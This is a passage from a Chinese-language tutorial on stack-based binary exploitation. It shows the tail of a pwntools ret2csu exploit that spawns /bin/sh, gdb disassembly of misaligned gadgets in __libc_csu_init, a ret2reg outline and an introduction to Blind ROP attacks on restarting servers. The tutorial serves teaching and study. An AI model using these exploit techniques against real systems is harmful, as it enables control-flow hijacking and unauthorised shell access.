log.success('execve_addr ' + hex(execve_addr))
##gdb.attach(sh)
## read(0,bss_base,16)
## read execve_addr and /bin/sh\x00
sh.recvuntil('Hello, World\n')
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + '/bin/sh\x00')
sh.recvuntil('Hello, World\n')
## execve(bss_base+8)
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
sh.interactive()
```
### 关于ret2csu的改进
在上面的时候，我们直接利用了这个通用 gadgets，其输入的字节长度为 128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法
##### 改进1 - 提前控制 rbx 与 rbp
可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足 cmp 的条件，并进行跳转。如果我们可以提前控制这两个数值，那么我们就可以减少 16 字节，即我们所需的字节数只需要112。
##### 改进2-多次利用
其实，改进 1 也算是一种多次利用。我们可以看到我们的 gadgets 是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次 gadgets 所需要的字节数。但这里的多次利用需要更加严格的条件
- 漏洞可以被多次触发
- 在两次触发之间，程序尚未修改 r12-r15 寄存器，这是因为要两次调用。
**当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。**
#### gadget
其实，除了上述这个gadgets，gcc默认还会编译进去一些其它的函数
```text
_init
_start
call_gmon_start
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
frame_dummy
__libc_csu_init
__libc_csu_fini
_fini
```
我们也可以尝试利用其中的一些代码来进行执行。此外，由于 PC 本身只是将程序的执行地址处的数据传递给CPU，而 CPU 则只是对传递来的数据进行解码，只要解码成功，就会进行执行。所以我们可以将源程序中一些地址进行偏移从而来获取我们所想要的指令，只要可以确保程序不崩溃。
需要一说的是，在上面的 libc_csu_init 中我们主要利用了以下寄存器
- 利用尾部代码控制了rbx，rbp，r12，r13，r14，r15。
- 利用中间部分的代码控制了rdx，rsi，edi。
而其实 libc_csu_init 的尾部通过偏移是可以控制其他寄存器的。其中，0x000000000040061A 是正常的起始地址，**可以看到我们在 0x000000000040061f 处可以控制 rbp 寄存器，在0x0000000000400621 处可以控制 rsi寄存器。**而如果想要深入地了解这一部分的内容，就要对汇编指令中的每个字段进行更加透彻地理解。如下。
```asm
gef➤  x/5i 0x000000000040061A
   0x40061a :	pop    rbx
   0x40061b :	pop    rbp
   0x40061c :	pop    r12
   0x40061e :	pop    r13
   0x400620 :	pop    r14
gef➤  x/5i 0x000000000040061b
   0x40061b :	pop    rbp
   0x40061c :	pop    r12
   0x40061e :	pop    r13
   0x400620 :	pop    r14
   0x400622 :	pop    r15
gef➤  x/5i 0x000000000040061A+3
   0x40061d :	pop    rsp
   0x40061e :	pop    r13
   0x400620 :	pop    r14
   0x400622 :	pop    r15
   0x400624 :	ret
gef➤  x/5i 0x000000000040061e
   0x40061e :	pop    r13
   0x400620 :	pop    r14
   0x400622 :	pop    r15
   0x400624 :	ret
   0x400625:	nop
gef➤  x/5i 0x000000000040061f
   0x40061f :	pop    rbp
   0x400620 :	pop    r14
   0x400622 :	pop    r15
   0x400624 :	ret
   0x400625:	nop
gef➤  x/5i 0x0000000000400620
   0x400620 :	pop    r14
   0x400622 :	pop    r15
   0x400624 :	ret
   0x400625:	nop
   0x400626:	nop    WORD PTR cs:[rax+rax*1+0x0]
gef➤  x/5i 0x0000000000400621
   0x400621 :	pop    rsi
   0x400622 :	pop    r15
   0x400624 :	ret
   0x400625:	nop
gef➤  x/5i 0x000000000040061A+9
   0x400623 :	pop    rdi
   0x400624 :	ret
   0x400625:	nop
   0x400626:	nop    WORD PTR cs:[rax+rax*1+0x0]
   0x400630 :	repz ret
```
### ret2reg原理
1. 查看溢出函返回时哪个寄存值指向溢出缓冲区空间
2. 然后反编译二进制，查找 call reg 或者jmp reg指令，将 EIP 设置为该指令地址
3. reg所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的)
### BROP基本介绍
BROP(Blind ROP)于2014年由Standford的Andrea Bittau提出，其相关研究成果发表在Oakland 2014，其论文题目是**Hacking Blind**，下面是作者对应的paper和slides,以及作者相应的介绍
- [paper](http://www.scs.stanford.edu/brop/bittau-brop.pdf)
- [slide](http://www.scs.stanford.edu/brop/bittau-brop-slides.pdf)
BROP是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流。
### BROP攻击条件
1. 源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。
2. 服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有ASLR保护，但是其只是在程序最初启动的时候有效果）。目前nginx, MySQL, Apache, OpenSSH等服务器应用都是符合这种特性的。
### BROP攻击原理
目前，大部分应用都会开启ASLR、NX、Canary保护。这里我们分别讲解在BROP中如何绕过这些保护，以及如何进行攻击。
### BROP攻击基本思路
在BROP中，基本的遵循的思路如下
-   判断栈溢出长度
    -   暴力枚举
-   Stack Reading
    -   获取栈上的数据来泄露canaries，以及ebp和返回地址。
-   Blind ROP
    -   找到足够多的 gadgets 来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及puts函数。
-   Build the exploit
    -   利用输出函数来 dump 出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit。
#### 栈溢出长度